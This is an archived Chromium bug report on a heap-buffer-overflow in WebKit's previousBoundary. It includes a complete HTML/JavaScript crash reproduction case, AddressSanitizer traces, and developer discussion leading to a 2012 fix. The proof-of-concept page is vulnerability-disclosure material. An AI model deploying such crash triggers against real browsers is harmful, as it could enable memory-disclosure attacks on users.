# Heap-buffer-overflow in WebCore::previousBoundary

| Field | Value |
|-------|-------|
| **Issue ID** | [40053682](https://issues.chromium.org/issues/40053682) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ke...@chromium.org |
| **Created** | 2012-02-13 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**

-webkit-text-security + ::first-letter + -webkit-user-modify: read-only => buffer-overflow

**VERSION**  

Chrome Version: stable beta dev

Chromium 19.0.1040.0 (Developer Build 121661)  

OS Linux  

WebKit 535.21 (@107445)

Operating System: 64bit linux

**REPRODUCTION CASE**

More As == larger buffer.

<html>
<head>
<style>
#el0 {
-webkit-text-security: circle;
}
#el0::first-letter {
display: table-row-group;
}
#el2 {
-webkit-user-modify: read-only;
display: table;
}
#el2:last-child {
display: table-row;
}
</style>
<script>
onload = function() {
el0 = document.createElement('div')
document.body.appendChild(el0)
el0.setAttribute('id','el0')
el1 = document.createElement('q')
el0.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id','el2')
el0.appendChild(el2)
el1.appendChild(document.createTextNode(Array(100).join('A')))
document.designMode='on'
document.execCommand('selectall')
document.execCommand('removeFormat')
el2.appendChild(document.createElement('div'))
document.execCommand('selectall')
document.execCommand('insertText', false, 'A')
document.execCommand('Undo')
el0.appendChild(document.createElement('div'))
document.execCommand('selectall')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==18035== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffed2a5543 at pc 0x555559499527 bp 0x7fffffff6770 sp 0x7fffffff6768  

READ of size 1 at 0x7fffed2a5543 thread T0  

#0 0x555559499527 in WTF::StringImpl::create(unsigned short const\*, unsigned int) ???:0  

#1 0x5555594a91cd in WTF::String::String(unsigned short const\*, unsigned int) ???:0  

#2 0x55555a43e018 in WebCore::previousBoundary(WebCore::VisiblePosition const&, unsigned int (\*)(unsigned short const\*, unsigned int, unsigned int, WebCore::BoundarySearchContextAvailability, bool&)) third\_party/WebKit/Source/WebCore/editing/visible\_units.cpp:0

0x7fffed2a5543 is located 61 bytes to the left of 32-byte region [0x7fffed2a5580,0x7fffed2a55a0)  

freed by thread T0 here:  

#0 0x55555da8f322 in free ??:0  

#1 0x555559338fd4 in WebCore::KURLGooglePrivate::~KURLGooglePrivate() ???:0  

#2 0x55555a591a16 in WebCore::DocumentLoader::~DocumentLoader() ???:0

## Attachments

- [stable-buffer-overflow.txt](attachments/stable-buffer-overflow.txt) (text/plain; charset=us-ascii, 7.7 KB)
- [beta-buffer-overflow.txt](attachments/beta-buffer-overflow.txt) (text/x-c; charset=us-ascii, 12.4 KB)
- [buffer-overflow.html](attachments/buffer-overflow.html) (text/html; charset=us-ascii, 1.2 KB)
- [buffer-overflow.txt](attachments/buffer-overflow.txt) (text/x-c; charset=us-ascii, 12.0 KB)
- [122146.txt](attachments/122146.txt) (text/plain; charset=us-ascii, 15.9 KB)
- [buffer-overflow-reduced.html](attachments/buffer-overflow-reduced.html) (text/html; charset=us-ascii, 745 B)

## Timeline

### ts...@chromium.org (2012-02-13)

[Empty comment from Monorail migration]

### ts...@chromium.org (2012-02-13)

Upstreamed as https://bugs.webkit.org/show_bug.cgi?id=78534

### in...@chromium.org (2012-02-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-15)

[Empty comment from Monorail migration]

### [Deleted User] (2012-02-15)

I can't reproduce any crash with the attached reduction (mac debug with Guard Malloc).

### kc...@chromium.org (2012-02-15)

rniwa: afaict, Guard malloc is weaker than asan.
Here we have "is located 61 bytes to the left of 32-byte region" i.e. buffer underflow.
I am not sure if Guard malloc detects underflows in the default mode. 

### [Deleted User] (2012-02-15)

It's hard for me to diagnose the issue if I can't reproduce it locally. My guess is that the render tree is getting out of date.

### kc...@chromium.org (2012-02-15)

The attach report is in fact a bit confusing. It says "heap-buffer-overflow" and then says "freed by thread". 

If I change the asan redzone to 256 (by setting evn var ASAN_OPTIONS=redzone=256) I get this instead: 

==29403== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f7a97a833c3 at pc 0x7f7abc15aef7 bp 0x7f7a9a437030 sp 0x7f7a9a437028                                                           
READ of size 1 at 0x7f7a97a833c3 thread T15                                                                                                                                                         
    #0 0x7f7abc15aef7 in WTF::StringImpl::create(unsigned short const*, unsigned int) third_party/WebKit/Source/JavaScriptCore/wtf/text/StringImpl.cpp:165                                          
    #1 0x7f7abc16a0c3 in WTF::PassRefPtr<WTF::StringImpl>::leakRef() const third_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:161                                                            
    #2 0x7f7abd0f8858 in WebCore::previousBoundary(WebCore::VisiblePosition const&, unsigned int (*)(unsigned short const*, unsigned int, unsigned int, WebCore::BoundarySearchContextAvailability,»
    #3 0x7f7abd0f6cd5 in WebCore::startOfWord(WebCore::VisiblePosition const&, WebCore::EWordSide) third_party/WebKit/Source/WebCore/editing/visible_units.cpp:250                                  
    #4 0x7f7abcfbf204 in WebCore::Editor::respondToChangedSelection(WebCore::VisibleSelection const&, unsigned int) third_party/WebKit/Source/WebCore/editing/Editor.cpp:2991    

0x7f7a97a833c3 is located 194 bytes to the right of 1-byte region [0x7f7a97a83300,0x7f7a97a83301)                                                                                                   
allocated by thread T15 here:                                                                                                                                                                       
    #0 0x7f7ac0639dd2 in malloc ??:0                                                                                                                                                                
    #1 0x7f7abc13ca4b in WTF::fastMalloc(unsigned long) third_party/WebKit/Source/JavaScriptCore/wtf/FastMalloc.cpp:268                                                                             
    #2 0x7f7abc15b450 in WTF::StringImpl::getData16SlowCase() const third_party/WebKit/Source/JavaScriptCore/wtf/text/StringImpl.cpp:206                                                            
    #3 0x7f7abca3f968 in WTF::String::characters() const third_party/WebKit/Source/JavaScriptCore/wtf/text/StringImpl.h:291                                                                         
    #4 0x7f7abd271d89 in ResourceRequest third_party/WebKit/Source/WebCore/platform/network/chromium/ResourceRequest.h:87                                                                           
    #5 0x7f7abc015662 in WebCore::Frame::init() third_party/WebKit/Source/WebCore/page/Frame.h:260                                                                                                  
    #6 0x7f7abc053f5e in WebKit::WebViewImpl::initializeMainFrame(WebKit::WebFrameClient*) WebViewImpl.cpp:300                     

(this is on an old chrome revision r122146)

### [Deleted User] (2012-02-15)

Looking at the stack trace and the relevant code carefully, it seems like this is yet another bug with TextIterator::character & length returning bad values :(

### sc...@gmail.com (2012-02-16)

[Empty comment from Monorail migration]

### [Deleted User] (2012-02-16)

This is definitely a bug in SimplifiedBackwardsTextIterator. Unfortunately, I can't debug it unless we have a better reduction. A more serious bug is in http://code.google.com/p/chromium/issues/detail?id=114054.

### ad...@chromium.org (2012-02-16)

It fails in debug with an assertion failure:

ASSERTION FAILED: 1 <= m_positionEndOffset - offsetInNode && m_positionEndOffset - offsetInNode <= static_cast<int>(text.length())
../../third_party/WebKit/Source/WebCore/editing/TextIterator.cpp(1242) : bool WebCore::SimplifiedBackwardsTextIterator::handleTextNode()


### ad...@chromium.org (2012-02-16)

Brain dump of my poking around:

the assertion fails due to RenderText::text() returning an empty string. However, the Text node associated with that RenderText contains 99 'A's.  So it seems (to me, who has almost zero experience in rendering) like the render tree is somehow out of sync with the dom tree.

### ad...@chromium.org (2012-02-16)

Attached is a further-reduced test case.

### [Deleted User] (2012-02-17)

Adam and I looked at this issue together but it appears that RenderTextFragment isn't setup property. Namely, m_end has some bogus value. It's probably that the code that implements -webkit-text-security: circle; isn't aware of how first-letter works.

### sc...@gmail.com (2012-02-22)

@rniwa @adamk: either one of you want to take the bold step of appearing in the "Owner" field?

### [Deleted User] (2012-03-01)

I've spent more time on this issue and added some comment on the webkit bug but I don't think I can fix it unless I can get some help from mitz, hyatt, or darin (apple) since I don't really understand how first-letter works.

### sk...@chromium.org (2012-03-01)

Thanks Ryosuke. Do you think you can get one (or all) of them to help you out?

### [Deleted User] (2012-03-05)

kenrb has a WebKit patch.

### in...@chromium.org (2012-03-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-08)

Maybe the out of bounds content can be retreived; hard to prove it cannot be hence $500

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### mi...@gmail.com (2012-03-09)

same here

### ke...@chromium.org (2012-03-09)

http://trac.webkit.org/changeset/110332

### sc...@gmail.com (2012-03-12)

M18: http://trac.webkit.org/changeset/110462

### sc...@gmail.com (2012-03-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/114056?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053682)*
